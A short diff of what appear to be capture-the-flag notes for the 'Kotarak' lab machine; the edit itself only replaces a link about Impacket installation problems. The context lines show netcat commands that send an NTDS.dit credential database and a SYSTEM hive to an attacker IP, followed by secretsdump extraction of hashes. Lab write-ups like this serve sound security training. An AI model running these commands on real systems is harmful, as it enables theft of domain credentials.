@@ -87,8 +87,7 @@ Sender
 tomcat@kotarak-dmz:/home/tomcat/to_archive/pentest_data$ nc 10.10.14.18 4444 < 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit
 tomcat@kotarak-dmz:/home/tomcat/to_archive/pentest_data$ nc 10.10.14.18 4444 < 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin
 └─# python /opt/impacket/examples/secretsdump.py -ntds test.dit -system test.bin
-
-Impacket issue : http://5.9.10.113/66087250/fix-for-kali-impacket-issues-between-python-2-and-3-2020-4
+https://unix.stackexchange.com/questions/583374/i-am-having-a-hard-time-installing-impacket-into-kali-linux-can-some-one-point
 
 A good reference here:
 https://apkash8.medium.com/hunting-and-exploiting-apache-ghostcat-b7446ef83e74
